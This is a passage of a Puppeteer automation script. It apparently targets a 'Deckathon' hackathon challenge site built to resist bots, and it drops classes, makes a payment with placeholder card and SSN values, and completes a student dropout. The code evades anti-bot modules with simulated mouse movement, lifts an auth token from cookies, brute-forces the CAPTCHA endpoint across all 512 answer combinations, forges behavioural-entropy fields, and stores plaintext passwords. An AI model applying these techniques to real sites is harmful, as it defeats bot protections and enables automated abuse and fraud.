                console.log(`Typing ${confirmWord}...`);
                const confirmInput = await page.$('input[placeholder*="Type"]');
                if (confirmInput) {
                    await confirmInput.type(confirmWord, { delay: 5 });
                    await sleep(300);
                    await page.evaluate(() => {
                        const buttons = Array.from(document.querySelectorAll('button'));
                        buttons.find(btn =>
                            btn.textContent.includes('Confirm and Drop') && !btn.disabled
                        )?.click();
                    });
                    console.log('Clicked Confirm and Drop');
                    await sleep(1000);
                }
            }
        }

        // ====================================================================
        // STEP 4: Make payment
        // ====================================================================
        console.log('Navigating to Finance...');
        await page.evaluate(() => {
            const buttons = Array.from(document.querySelectorAll('button'));
            buttons.find(btn => btn.textContent.includes('Finance'))?.click();
        });
        console.log('Clicked Finance button');
        await sleep(300);

        await page.evaluate(() => {
            const links = Array.from(document.querySelectorAll('a'));
            links.find(link => link.textContent.includes('Make a Payment'))?.click();
        });
        console.log('Clicked Make a Payment');
        await sleep(500);

        await page.evaluate(() => {
            const buttons = Array.from(document.querySelectorAll('button'));
            buttons.find(b => b.textContent.includes('Continue to Payment') && !b.disabled)?.click();
        });
        console.log('Clicked Continue to Payment');
        await sleep(1000);

        // Handle the moving "Slide to confirm" modal
        console.log('Looking for slide to confirm modal...');
        const sliderHandle = await page.$('.slider-handle');
        if (sliderHandle) {
            console.log('Found slider - dragging...');
            // Try multiple times since the modal moves
            for (let attempt = 0; attempt < 5; attempt++) {
                try {
                    const sliderContainer = await page.$('.slider-container');
                    if (sliderContainer) {
                        const containerBox = await sliderContainer.boundingBox();
                        const handleBox = await sliderHandle.boundingBox();
                        if (containerBox && handleBox) {
                            // Start from handle center
                            const startX = handleBox.x + handleBox.width / 2;
                            const startY = handleBox.y + handleBox.height / 2;
                            // End at right side of container
                            const endX = containerBox.x + containerBox.width - 10;

                            await page.mouse.move(startX, startY);
                            await page.mouse.down();
                            await sleep(50);
                            // Drag in steps
                            for (let i = 0; i < 10; i++) {
                                const x = startX + ((endX - startX) * (i + 1)) / 10;
                                await page.mouse.move(x, startY, { steps: 2 });
                                await sleep(20);
                            }
                            await page.mouse.up();
                            console.log('Slider dragged');
                            break;
                        }
                    }
                } catch (e) {
                    console.log(`Slider attempt ${attempt + 1} failed, retrying...`);
                    await sleep(200);
                }
            }
            await sleep(1000);
        }

        // Solve number sequence verification (e.g., "1 -> 3 -> 8")
        const sequence = await page.evaluate(() => {
            const seqEl = document.querySelector('.sequence-display');
            if (seqEl) {
                return seqEl.textContent
                    .split('→')
                    .map(s => parseInt(s.trim()))
                    .filter(n => !isNaN(n));
            }
            return [];
        });

        if (sequence.length > 0) {
            console.log(`Clicking sequence: ${sequence.join(' -> ')}`);
            for (const num of sequence) {
                await page.evaluate((n) => {
                    const buttons = Array.from(document.querySelectorAll('.grid.grid-cols-3 button'));
                    buttons.find(b => b.textContent.trim() === String(n))?.click();
                }, num);
                await sleep(100);
            }
            console.log('Sequence completed');
            await sleep(1000);
        }

        // ================================================================
        // SELF-HEALING PAYMENT LOOP - Retry if payment fails
        // ================================================================
        let paymentVerified = false;
        const MAX_PAYMENT_RETRIES = 3;

        for (let paymentAttempt = 1; paymentAttempt <= MAX_PAYMENT_RETRIES && !paymentVerified; paymentAttempt++) {
            if (paymentAttempt > 1) {
                console.log(`\n🔄 PAYMENT RETRY (Attempt ${paymentAttempt}/${MAX_PAYMENT_RETRIES})`);

                // Close any leftover payment tabs
                await closePaymentTabs(browser, page);

                // Navigate back to finances page
                console.log('Navigating back to finances...');
                const finUrl = await page.url();
                if (!finUrl.includes('finance')) {
                    await page.evaluate(() => {
                        const links = Array.from(document.querySelectorAll('a'));
                        const finLink = links.find(l =>
                            l.textContent.includes('Finances') ||
                            l.textContent.includes('Payment') ||
                            l.href?.includes('finance')
                        );
                        if (finLink) finLink.click();
                    });
                    await sleep(1500);
                }
            }

            // Get remaining balance and enter payment amount
            console.log('Looking for balance...');
            const balance = await page.evaluate(() => {
                const allSpans = document.querySelectorAll('span');
                for (const span of allSpans) {
                    if (span.textContent.includes('Remaining Balance')) {
                        const parent = span.closest('div');
                        if (parent) {
                            const amountEl = parent.querySelector('.text-primary-600') ||
                                parent.querySelector('.font-bold');
                            if (amountEl) {
                                const match = amountEl.textContent.match(/\$([\d.]+)/);
                                if (match) return match[1];
                            }
                        }
                    }
                }
                return null;
            });

            if (balance) {
                console.log(`Balance: $${balance}`);

                // Enter amount
                await page.evaluate((amt) => {
                    const input = document.querySelector('#amount');
                    if (input) {
                        input.disabled = false;
                        input.value = amt;
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                    }
                }, balance);
                console.log(`Entered amount: ${balance}`);

                // Select CAD currency
                await page.evaluate(() => {
                    const select = document.querySelector('#currency');
                    if (select) {
                        select.disabled = false;
                        select.value = 'CAD';
                        select.dispatchEvent(new Event('change', { bubbles: true }));
                    }
                });
                console.log('Selected CAD');
                await sleep(300);

                // Click Continue (opens new tab)
                const pagesBefore = await browser.pages();
                await page.evaluate(() => {
                    const buttons = Array.from(document.querySelectorAll('button'));
                    buttons.find(b => b.textContent.trim() === 'Continue' && !b.disabled)?.click();
                });
                console.log('Clicked Continue');
                await sleep(1500);

                // ================================================================
                // STEP 5: Handle payment in new tab
                // ================================================================
                const pagesAfter = await browser.pages();
                if (pagesAfter.length > pagesBefore.length) {
                    const newPage = pagesAfter[pagesAfter.length - 1];
                    await newPage.bringToFront();
                    console.log('Switched to new tab:', await newPage.url());
                    await sleep(1000);

                    // Fill fake card details with realistic mouse and typing
                    console.log('Filling card info...');

                    // Move to card number field and type slowly
                    const cardNumField = await newPage.$('#card-number');
                    if (cardNumField) {
                        const box = await cardNumField.boundingBox();
                        await newPage.mouse.move(box.x + box.width / 2, box.y + box.height / 2, { steps: 10 });
                        await sleep(100);
                        await cardNumField.click();
                        await sleep(150);
                        for (const char of '4532 1234 5678 9012') {
                            await newPage.keyboard.type(char, { delay: 40 + Math.random() * 30 });
                        }
                    }
                    await sleep(200);

                    // Move to CVV field
                    const cvvField = await newPage.$('#cvv');
                    if (cvvField) {
                        const box = await cvvField.boundingBox();
                        await newPage.mouse.move(box.x + box.width / 2, box.y + box.height / 2, { steps: 10 });
                        await sleep(100);
                        await cvvField.click();
                        await sleep(150);
                        for (const char of '123') {
                            await newPage.keyboard.type(char, { delay: 40 + Math.random() * 30 });
                        }
                    }
                    await sleep(200);

                    // Move to expiry field
                    const expiryField = await newPage.$('#expiry');
                    if (expiryField) {
                        const box = await expiryField.boundingBox();
                        await newPage.mouse.move(box.x + box.width / 2, box.y + box.height / 2, { steps: 10 });
                        await sleep(100);
                        await expiryField.click();
                        await sleep(150);
                        for (const char of '12/28') {
                            await newPage.keyboard.type(char, { delay: 40 + Math.random() * 30 });
                        }
                    }
                    await sleep(300);

                    // Move to Save Card button and click
                    const allBtns = await newPage.$$('button');
                    for (const btn of allBtns) {
                        const text = await newPage.evaluate(el => el.textContent, btn);
                        if (text.includes('Save Card')) {
                            const box = await btn.boundingBox();
                            await newPage.mouse.move(box.x + box.width / 2, box.y + box.height / 2, { steps: 10 });
                            await sleep(150);
                            break;
                        }
                    }
                    await newPage.evaluate(() => {
                        const buttons = Array.from(document.querySelectorAll('button'));
                        buttons.find(b => b.textContent.includes('Save Card'))?.click();
                    });
                    console.log('Clicked Save Card');

                    // Wait 6s with small mouse movements
                    for (let i = 0; i < 6; i++) {
                        await sleep(1000);
                        await newPage.mouse.move(
                            400 + Math.random() * 200,
                            300 + Math.random() * 100,
                            { steps: 5 }
                        );
                    }

                    // Click Save Card again
                    await newPage.evaluate(() => {
                        const buttons = Array.from(document.querySelectorAll('button'));
                        buttons.find(b => b.textContent.includes('Save Card'))?.click();
                    });
                    console.log('Clicked Save Card again');
                    await sleep(300);

                    // Click Continue with retry
                    console.log('Looking for Continue button...');
                    const continueClicked = await newPage.evaluate(() => {
                        const buttons = Array.from(document.querySelectorAll('button'));
                        const btn = buttons.find(b => b.textContent.includes('Continue') && !b.disabled);
                        if (btn) {
                            btn.click();
                            return true;
                        }
                        return false;
                    });

                    if (continueClicked) {
                        console.log('Clicked Continue');
                    } else {
                        console.log('Continue button not found, trying again...');
                        await sleep(300);
                        await newPage.evaluate(() => {
                            const buttons = Array.from(document.querySelectorAll('button'));
                            buttons.find(b => b.textContent.includes('Continue'))?.click();
                        });
                    }
                    await sleep(1500);


                    await bezierMoveAndClick(newPage, 'Process Payment');
                    console.log('Clicked Process Payment');
                    await sleep(8200);

                    // Click Process Payment again
                    await bezierMoveAndClick(newPage, 'Process Payment');
                    console.log('Clicked Process Payment again');
                    await sleep(1000);

                    // Check if CAPTCHA appeared, if not retry
                    let hasCaptcha = await newPage.evaluate(() =>
                        document.body.innerText.includes("Verify You're Human")
                    );
                    if (!hasCaptcha) {
                        console.log('CAPTCHA not detected, retrying...');
                        await sleep(7500);
                        await bezierMoveAndClick(newPage, 'Process Payment');
                        console.log('Clicked Process Payment (third attempt)');
                        await sleep(1000);
                    }

                    // Solve payment CAPTCHA with Gemini
                    await solveGeminiCaptcha(newPage);
                    console.log('Payment flow complete');

                    // ============================================================
                    // STEP 6: Complete student dropout
                    // ============================================================
                    console.log('Switching back to main tab...');
                    await page.bringToFront();
                    await sleep(500);

                    console.log('Navigating to Student Dropout...');
                    await page.evaluate(() => {
                        const links = Array.from(document.querySelectorAll('a'));
                        links.find(l => l.textContent.includes('Student Dropout'))?.click();
                    });
                    await sleep(1000);

                    // ============================================================
                    // SELF-HEALING: Check if payment was successful
                    // ============================================================
                    const hasUnpaidBalance = await checkRemainingBalance(page);

                    if (hasUnpaidBalance) {
                        console.log('⚠️ Payment not completed - balance still unpaid');
                        if (paymentAttempt < MAX_PAYMENT_RETRIES) {
                            console.log('Will retry payment...');
                            continue; // Retry the payment loop
                        } else {
                            console.log('❌ Max payment attempts reached - proceeding anyway');
                        }
                    } else {
                        console.log('✅ Payment verified - proceeding with dropout');
                    }

                    paymentVerified = true;
                    break; // Exit the payment retry loop
                } // End pagesAfter check
            } // End balance check
        } // End payment retry loop

        // ============================================================
        // Continue with Student Dropout (outside retry loop)
        // ============================================================

        // Navigate to Student Dropout if not already there
        console.log('Ensuring we are on Student Dropout page...');
        await page.evaluate(() => {
            const links = Array.from(document.querySelectorAll('a'));
            links.find(l => l.textContent.includes('Student Dropout'))?.click();
        });
        await sleep(500);

        // Click Start Dropout (may be in shadow DOM)
        const startClicked = await page.evaluate(() => {
            // Try shadow DOM first
            const shadowContainer = document.querySelector('.shadow-container');
            if (shadowContainer?.shadowRoot) {
                const btn = shadowContainer.shadowRoot.querySelector('.real-dropout-btn');
                if (btn) { btn.click(); return true; }
            }
            // Try regular DOM
            const btn = document.querySelector('.real-dropout-btn');
            if (btn) { btn.click(); return true; }
            // Try by text
            const buttons = Array.from(document.querySelectorAll('button'));
            const textBtn = buttons.find(b => b.textContent.includes('Start Dropout'));
            if (textBtn) { textBtn.click(); return true; }
            return false;
        });
        console.log(startClicked ? 'Clicked Start Dropout Process' : 'Start Dropout button not found');
        await sleep(500);

        // Select dropout reason
        await page.evaluate(() => {
            const radios = document.querySelectorAll('input[type="radio"]');
            for (const radio of radios) {
                if (radio.value.includes('Academic program')) {
                    radio.click();
                    break;
                }
            }
        });
        console.log('Selected dropout reason');
        await sleep(300);

        // Natural mouse movement (anti-bot bypass)
        await naturalMouseMove(page);

        // === ANTI-BOT: Wild mouse movements for 2 seconds ===
        console.log('Moving mouse wildly...');
        const startTime = Date.now();
        while (Date.now() - startTime < 2000) {
            await page.mouse.move(
                100 + Math.random() * 1600,
                100 + Math.random() * 800,
                { steps: 3 }
            );
            await sleep(50);
        }

        // Click "Other (please specify)" and type random letters
        console.log('Filling Other field...');
        await page.evaluate(() => {
            const radios = document.querySelectorAll('input[type="radio"]');
            for (const radio of radios) {
                if (radio.value.includes('Other') || radio.nextSibling?.textContent?.includes('Other')) {
                    radio.click();
                    break;
                }
            }
        });
        await sleep(300);

        // Type random letters in the specify field
        const otherInput = await page.$('input[placeholder*="specify"], input[placeholder*="Please"], textarea');
        if (otherInput) {
            await otherInput.click();
            const randomText = Array.from({ length: 50 }, () =>
                String.fromCharCode(97 + Math.floor(Math.random() * 26))
            ).join('');
            await otherInput.type(randomText, { delay: 10 });
        }

        // Open blank tab, wait 11s, return
        console.log('Opening blank tab...');
        const blankPage = await browser.newPage();
        await blankPage.goto('about:blank');
        await sleep(11000);
        await blankPage.close();
        await page.bringToFront();
        console.log('Returned to main tab');

        // Click Next button
        console.log('Looking for Next button...');
        const nextBtn = await page.$('button.bg-primary-600');
        if (nextBtn) {
            await nextBtn.click();
            console.log('Clicked Next');
        } else {
            await page.evaluate(() => {
                const buttons = Array.from(document.querySelectorAll('button'));
                buttons.find(b => b.querySelector('span')?.textContent?.trim() === 'Next')?.click();
            });
            console.log('Clicked Next (fallback)');
        }
        await sleep(1000);

        // ============================================================
        // Solve anti-bot modules that appear before final CAPTCHA
        // ============================================================
        console.log('Looking for anti-bot modules...');

        let modulesSolved = 0;
        const MAX_MODULES = 20;
        let lastModule = '';
        let sameModuleCount = 0;

        while (modulesSolved < MAX_MODULES) {
            await sleep(200);
            const pageText = await page.evaluate(() => document.body.innerText);

            // Check if we've reached the final CAPTCHA
            if (pageText.includes("Verify You're Human") && pageText.includes("Select all")) {
                console.log('Reached final CAPTCHA - stopping');
                break;
            }

            // 1. Verify Email - Type "VERIFY" and click Verify
            const hasEmailVerify = await page.evaluate(() =>
                document.body.innerText.includes('Verify Your Email') &&
                document.body.innerText.includes('The code is "VERIFY"')
            );
            if (hasEmailVerify) {
                if (lastModule === 'email') {
                    sameModuleCount++;
                    if (sameModuleCount >= 5) {
                        console.log('Stuck on Verify Email, breaking...');
                        break;
                    }
                } else {
                    lastModule = 'email';
                    sameModuleCount = 1;
                }
                console.log('Module: Verify Email');
                // Type VERIFY and click using evaluate
                await page.evaluate(() => {
                    const input = document.querySelector('input[placeholder*="verification"], input[placeholder*="Enter"]');
                    if (input) {
                        input.value = 'VERIFY';
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                    }
                    const btns = Array.from(document.querySelectorAll('button'));
                    const verifyBtn = btns.find(b => b.textContent.includes('Verify') && !b.textContent.includes('Resend'));
                    if (verifyBtn) verifyBtn.click();
                });
                console.log('Typed VERIFY and clicked button');
                modulesSolved++;
                await sleep(500);
                continue;
            }

            // 2. Please Wait - Wait for 100% then click Continue
            const hasWait = await page.evaluate(() =>
                document.body.innerText.includes('Please Wait...')
            );
            if (hasWait) {
                if (lastModule === 'wait') {
                    sameModuleCount++;
                    if (sameModuleCount >= 5) {
                        console.log('Stuck on Please Wait, breaking...');
                        break;
                    }
                } else {
                    lastModule = 'wait';
                    sameModuleCount = 1;
                }
                console.log('Module: Please Wait...');
                // Wait for progress to reach 100%
                await page.waitForFunction(() => {
                    const text = document.body.innerText;
                    return text.includes('100%');
                }, { timeout: 30000 }).catch(() => { });
                await sleep(500);
                // Find and click Continue button directly
                const continueBtn = await page.$('button.bg-blue-600');
                if (continueBtn) {
                    await continueBtn.click();
                    console.log('Clicked Continue (direct)');
                } else {
                    await page.evaluate(() => {
                        const buttons = Array.from(document.querySelectorAll('button'));
                        buttons.find(b => b.textContent.includes('Continue') && !b.disabled)?.click();
                    });
                    console.log('Clicked Continue (fallback)');
                }
                modulesSolved++;
                await sleep(1000);
                continue;
            }

            // 3. Keyboard Test - Press 5 different keys
            const hasKeyboard = await page.evaluate(() =>
                document.body.innerText.includes('Keyboard Test') &&
                document.body.innerText.includes('Press any 5 different keys')
            );
            if (hasKeyboard) {
                console.log('Module: Keyboard Test');
                // Click on the area to focus
                await page.click('.bg-white.border-2.border-green-400');
                await sleep(100);
                // Press 5 different keys
                const keys = ['a', 'b', 'c', 'd', 'e'];
                for (const key of keys) {
                    await page.keyboard.press(key);
                    await sleep(100);
                }
                await sleep(300);
                await page.evaluate(() => {
                    const buttons = Array.from(document.querySelectorAll('button'));
                    buttons.find(b => b.textContent.includes('Submit'))?.click();
                });
                modulesSolved++;
                await sleep(500);
                continue;
            }

            // 4. Bot Detection - DON'T check box, just click Verify
            const hasBotDetect = await page.evaluate(() =>
                document.body.innerText.includes('Bot Detection') &&
                document.body.innerText.includes('I am a robot')
            );
            if (hasBotDetect) {
                console.log('Module: Bot Detection (NOT checking box)');
                await page.evaluate(() => {
                    const buttons = Array.from(document.querySelectorAll('button'));
                    buttons.find(b => b.textContent.includes('Verify'))?.click();
                });
                modulesSolved++;
                await sleep(500);
                continue;
            }

            // 5. System Update - Hover over red X 3 times then click
            const hasSystemUpdate = await page.evaluate(() =>
                document.body.innerText.includes('System Update') &&
                document.body.innerText.includes('Hover:')
            );
            if (hasSystemUpdate) {
                console.log('Module: System Update (hover game)');
                for (let i = 0; i < 5; i++) { // Extra hovers in case
                    const redBtn = await page.$('button.bg-red-500');
                    if (redBtn) {
                        const box = await redBtn.boundingBox();
                        if (box) {
                            await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2, { steps: 5 });
                            await sleep(300);
                        }
                    }
                }
                await sleep(300);
                // Now click the red button
                const redBtn = await page.$('button.bg-red-500');
                if (redBtn) await redBtn.click();
                modulesSolved++;
                await sleep(500);
                continue;
            }

            // 6. Select Location - Select all dropdowns and confirm
            const hasLocation = await page.evaluate(() =>
                document.body.innerText.includes('Select Your Location') &&
                document.body.innerText.includes('Country')
            );
            if (hasLocation) {
                console.log('Module: Select Location');
                // Select Country
                await page.select('select:nth-of-type(1)', 'Canada');
                await sleep(500);
                // Select Region (wait for it to be enabled)
                await page.waitForFunction(() => {
                    const selects = document.querySelectorAll('select');
                    return selects[1] && !selects[1].disabled;
                }, { timeout: 3000 }).catch(() => { });
                await page.evaluate(() => {
                    const selects = document.querySelectorAll('select');
                    if (selects[1] && selects[1].options.length > 1) {
                        selects[1].value = selects[1].options[1].value;
                        selects[1].dispatchEvent(new Event('change', { bubbles: true }));
                    }
                });
                await sleep(500);
                // Select City (wait for it to be enabled)
                await page.waitForFunction(() => {
                    const selects = document.querySelectorAll('select');
                    return selects[2] && !selects[2].disabled;
                }, { timeout: 3000 }).catch(() => { });
                await page.evaluate(() => {
                    const selects = document.querySelectorAll('select');
                    if (selects[2] && selects[2].options.length > 1) {
                        selects[2].value = selects[2].options[1].value;
                        selects[2].dispatchEvent(new Event('change', { bubbles: true }));
                    }
                });
                await sleep(300);
                await page.evaluate(() => {
                    const buttons = Array.from(document.querySelectorAll('button'));
                    buttons.find(b => b.textContent.includes('Confirm'))?.click();
                });
                modulesSolved++;
                await sleep(500);
                continue;
            }

            // 7. Terms & Conditions - Scroll to bottom, check box, click Accept
            const hasTerms = await page.evaluate(() =>
                document.body.innerText.includes('Terms & Conditions') &&
                document.body.innerText.includes('I agree to the terms')
            );
            if (hasTerms) {
                console.log('Module: Terms & Conditions');
                // Scroll the terms box to bottom
                await page.evaluate(() => {
                    const scrollBox = document.querySelector('.overflow-y-scroll');
                    if (scrollBox) scrollBox.scrollTop = scrollBox.scrollHeight;
                });
                await sleep(300);
                // Check the checkbox
                await page.evaluate(() => {
                    const checkbox = document.querySelector('input[type="checkbox"]');
                    if (checkbox && !checkbox.checked) checkbox.click();
                });
                await sleep(200);
                // Click Accept
                await page.evaluate(() => {
                    const buttons = Array.from(document.querySelectorAll('button'));
                    buttons.find(b => b.textContent.includes('Accept'))?.click();
                });
                modulesSolved++;
                await sleep(500);
                continue;
            }

            // 8. Hidden Button - Click the hidden button 5 times
            const hasHidden = await page.evaluate(() =>
                document.body.innerText.includes('Important Notice') &&
                document.body.innerText.includes('hidden button')
            );
            if (hasHidden) {
                if (lastModule === 'hidden') {
                    sameModuleCount++;
                    if (sameModuleCount >= 5) {
                        console.log('Stuck on Hidden Button, breaking...');
                        break;
                    }
                } else {
                    lastModule = 'hidden';
                    sameModuleCount = 1;
                }
                console.log('Module: Hidden Button');
                // Click the hidden button 5 times using evaluate
                for (let i = 0; i < 6; i++) {
                    await page.evaluate(() => {
                        const btns = Array.from(document.querySelectorAll('button'));
                        const hiddenBtn = btns.find(b => b.textContent.includes('Hidden'));
                        if (hiddenBtn) hiddenBtn.click();
                    });
                    await sleep(100);
                }
                modulesSolved++;
                await sleep(200);
                continue;
            }

            // 9. Browser Update Required - Check box, click Continue Anyway
            const hasBrowserUpdate = await page.evaluate(() =>
                document.body.innerText.includes('Browser Update Required') &&
                document.body.innerText.includes('I understand the risks')
            );
            if (hasBrowserUpdate) {
                console.log('Module: Browser Update Required');
                // Check the checkbox
                await page.evaluate(() => {
                    const checkbox = document.querySelector('input[type="checkbox"]');
                    if (checkbox && !checkbox.checked) checkbox.click();
                });
                await sleep(200);
                // Click Continue Anyway
                await page.evaluate(() => {
                    const buttons = Array.from(document.querySelectorAll('button'));
                    buttons.find(b => b.textContent.includes('Continue Anyway'))?.click();
                });
                modulesSolved++;
                await sleep(500);
                continue;
            }

            // 10. Newsletter Subscribe - Type UNSUBSCRIBE and click Continue
            const hasNewsletter = await page.evaluate(() =>
                document.body.innerText.includes('Subscribe to Our Newsletter')
            );
            if (hasNewsletter) {
                console.log('Module: Newsletter Subscribe');
                // Type UNSUBSCRIBE and click Continue
                await page.evaluate(() => {
                    const input = document.querySelector('input[placeholder*="UNSUBSCRIBE"], input[placeholder*="skip"]');
                    if (input) {
                        input.value = 'UNSUBSCRIBE';
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                    }
                    const btns = Array.from(document.querySelectorAll('button'));
                    const continueBtn = btns.find(b => b.textContent.includes('Continue') && !b.textContent.includes('Anyway'));
                    if (continueBtn) continueBtn.click();
                });
                console.log('Typed UNSUBSCRIBE and clicked Continue');
                modulesSolved++;
                await sleep(200);
                continue;
            }

            // 11. Identity Verification - Enter fake SSN and click Verify Identity
            const hasIdentity = await page.evaluate(() =>
                document.body.innerText.includes('Identity Verification') &&
                document.body.innerText.includes('Social Security')
            );
            if (hasIdentity) {
                console.log('Module: Identity Verification');
                const input = await page.$('input[placeholder*="XXX"]');
                if (input) {
                    await input.click({ clickCount: 3 });
                    await page.keyboard.press('Backspace');
                    await input.type('123-45-6789', { delay: 30 });
                }
                await sleep(300);
                const btns = await page.$$('button');
                for (const btn of btns) {
                    const text = await page.evaluate(el => el.textContent, btn);
                    if (text.includes('Verify Identity')) {
                        await btn.click();
                        console.log('Clicked Verify Identity');
                        break;
                    }
                }
                modulesSolved++;
                await sleep(1000);
                continue;
            }

            // 12. Quick Survey - Click 5 star rating and Submit
            const hasSurvey = await page.evaluate(() =>
                document.body.innerText.includes('Quick Survey') &&
                document.body.innerText.includes('Rate your experience')
            );
            if (hasSurvey) {
                console.log('Module: Quick Survey');
                // Click one star (the 5th one for 5 stars, but any works)
                const stars = await page.$$('button');
                let starClicked = false;
                for (const star of stars) {
                    const text = await page.evaluate(el => el.textContent, star);
                    if (text.trim() === '★') {
                        await star.click();
                        console.log('Clicked star');
                        starClicked = true;
                        break; // Just click one star
                    }
                }
                await sleep(200);
                // Click Submit
                if (starClicked) {
                    const btns = await page.$$('button');
                    for (const btn of btns) {
                        const text = await page.evaluate(el => el.textContent, btn);
                        if (text.includes('Submit')) {
                            await btn.click();
                            console.log('Clicked Submit (Survey)');
                            break;
                        }
                    }
                }
                modulesSolved++;
                await sleep(300);
                continue;
            }

            // No module found - might be done or something new
            console.log('No known module detected, checking for final CAPTCHA...');
            break;
        }

        console.log(`Solved ${modulesSolved} anti-bot modules`);

        // ============================================================
        // FINAL STEP: Complete dropout with brute force CAPTCHA
        // ============================================================
        console.log('Starting final dropout sequence...');

        // 1. Click the iframe checkbox
        console.log('Looking for iframe checkbox...');
        const iframeHandle = await page.$('iframe');
        if (iframeHandle) {
            const frame = await iframeHandle.contentFrame();
            if (frame) {
                await frame.evaluate(() => {
                    const cb = document.getElementById('final-agree');
                    if (cb && !cb.checked) cb.click();
                });
                console.log('Checked iframe checkbox');
            }
        }
        await sleep(300);

        // 2. Click Confirm Dropout
        await page.evaluate(() => {
            const btns = Array.from(document.querySelectorAll('button'));
            const btn = btns.find(b => b.textContent.includes('Confirm Dropout'));
            if (btn) btn.click();
        });
        console.log('Clicked Confirm Dropout');
        await sleep(1000);

        // 3. Get auth token - try document.cookie first (most reliable)
        let authToken = await page.evaluate(() => {
            // Check document.cookie
            const match = document.cookie.match(/auth_token=([^;]+)/);
            if (match) return match[1];

            // Check localStorage
            const lsToken = localStorage.getItem('auth_token') || localStorage.getItem('token');
            if (lsToken) return lsToken;

            return null;
        });

        // Try puppeteer cookies from backend domain
        if (!authToken) {
            const cookies = await page.cookies('https://hackathon-backend-326152168.us-east4.run.app');
            console.log(`Backend cookies: ${cookies.length} found`);
            const authCookie = cookies.find(c => c.name === 'auth_token');
            if (authCookie) {
                authToken = authCookie.value;
                console.log('Got auth token from backend cookies');
            }
        }

        if (!authToken) {
            console.log('No auth token found');
        } else {
            console.log('Auth token acquired');

            // 4. Run the brute force CAPTCHA attack
            console.log('Running brute force CAPTCHA attack...');
            const result = await page.evaluate(async (token) => {
                const AUTH_HEADER = "Bearer " + token;
                const BASE_URL = "https://hackathon-backend-326152168.us-east4.run.app";

                // Fetch puzzle
                let challengeData;
                try {
                    const res = await fetch(`${BASE_URL}/captcha/challenge?challenge_type=pretty_faces`);
                    if (!res.ok) return { error: 'Failed to fetch puzzle' };
                    challengeData = await res.json();
                } catch (e) {
                    return { error: 'Network error fetching puzzle' };
                }

                // Brute force
                const encryptedKey = challengeData.encrypted_answer;
                const allUrls = challengeData.images.map(img => img.url);
                const totalCombinations = 512;
                const batchSize = 50;
                let solvedToken = null;

                for (let i = 0; i < totalCombinations; i += batchSize) {
                    const batchPromises = [];
                    for (let j = 0; j < batchSize; j++) {
                        if (i + j >= totalCombinations) break;
                        const currentVal = i + j;
                        const selectedUrls = [];
                        for (let bit = 0; bit < 9; bit++) {
                            if ((currentVal >> bit) & 1) selectedUrls.push(allUrls[bit]);
                        }
                        const p = fetch(`${BASE_URL}/captcha/submit`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json", "Authorization": AUTH_HEADER },
                            body: JSON.stringify({ purpose: "dropout", encrypted_answer: encryptedKey, selected_urls: selectedUrls })
                        }).then(async res => {
                            if (res.ok) return (await res.json()).captcha_solved_token;
                            return false;
                        }).catch(() => false);
                        batchPromises.push(p);
                    }
                    const results = await Promise.all(batchPromises);
                    solvedToken = results.find(r => r !== false);
                    if (solvedToken) break;
                    await new Promise(r => setTimeout(r, 10));
                }

                if (!solvedToken) return { error: 'Failed to solve captcha' };

                // Send final dropout request
                const superPayload = {
                    captcha_solved_token: solvedToken,
                    keystroke_count: 310,
                    unique_chars_count: 45,
                    checkbox_entropy: 150.5,
                    confirm_button_entropy: 150.0,
                    captcha_entropy: 750.0,
                    time_on_page: 2500.0
                };

                try {
                    const response = await fetch(`${BASE_URL}/dropout`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json", "Authorization": AUTH_HEADER },
                        body: JSON.stringify(superPayload)
                    });
                    const data = await response.json();
                    if (response.ok) {
                        return { success: true, data };
                    } else {
                        return { error: 'Dropout failed', status: response.status, data };
                    }
                } catch (e) {
                    return { error: 'Network error on dropout' };
                }
            }, authToken);

            if (result.success) {
                console.log('🎉 DROPOUT SUCCESSFUL!');
                console.log('Response:', JSON.stringify(result.data));
                isSuccess = true;
            } else {
                console.log('Dropout failed:', result.error);
                if (result.data) console.log('Details:', JSON.stringify(result.data));
            }

            // 5. Refresh page
            await page.reload({ waitUntil: 'domcontentloaded' });
            console.log('Page refreshed');
        }

        // ====================================================================
        // STEP 7: Save credentials to file
        // ====================================================================
        const credentialsPath = path.join(__dirname, 'data', 'deckathon_credentials.json');
        const dataDir = path.join(__dirname, 'data');
        if (!fs.existsSync(dataDir)) {
            fs.mkdirSync(dataDir, { recursive: true });
        }

        let credentials = [];
        if (fs.existsSync(credentialsPath)) {
            try {
                credentials = JSON.parse(fs.readFileSync(credentialsPath, 'utf8'));
            } catch (e) {
                // Start fresh if file is corrupted
            }
        }

        credentials.push({
            username,
            fullName: fullName || 'Unknown',
            email: email || 'Unknown',
            password,
            success: isSuccess,
            timestamp: new Date().toISOString()
        });
        fs.writeFileSync(credentialsPath, JSON.stringify(credentials, null, 2));
        console.log('Saved credentials');

        await sleep(500);
        console.log('Done!');

        // Close browser if running as part of batch
        if (runId !== undefined && browser) {
            await browser.close();
        }

        return { success: isSuccess, username, error: null };

    } catch (error) {
        console.error('Error:', error.message);
        if (runId !== undefined && browser) {
            try { await browser.close(); } catch (e) { }
        }
        return { success: false, username: null, error: error.message };
    }


}

// ============================================================================
// WRAPPER FUNCTION (backwards compatible)
// ============================================================================

/**
 * Full registration flow - creates account then drops classes
 * @param {Object} options - Optional configuration
 * @param {number} options.runId - Run ID for logging
 * @returns {Promise<{success: boolean, username: string, error: string|null}>}
 */
async function registerOnDeckathon(options = {}) {
    const { runId } = options;
    const prefix = runId !== undefined ? `[Run ${runId}] ` : '';

    console.log(`${prefix}Starting Full Deckathon Registration Flow\n`);

    // Step 1: Register account
    const accountResult = await registerDeckathonAccount({ runId });

    if (!accountResult.success) {
        console.log('Account registration failed:', accountResult.error);
        return { success: false, username: accountResult.netname, error: accountResult.error };
    }

    // Step 2: Drop classes and complete dropout
    const dropResult = await dropClasses({
        netname: accountResult.netname,
        password: accountResult.password,
        email: accountResult.email,
        fullName: accountResult.fullName,
        runId
    });

    return dropResult;
}

// Export for use in run10.js
module.exports = { registerOnDeckathon, registerDeckathonAccount, dropClasses };

// Run directly if this file is executed (NOT when imported by Electron)
const isElectron = process.versions && process.versions.electron;
if (require.main === module && !isElectron) {
    registerOnDeckathon();
}

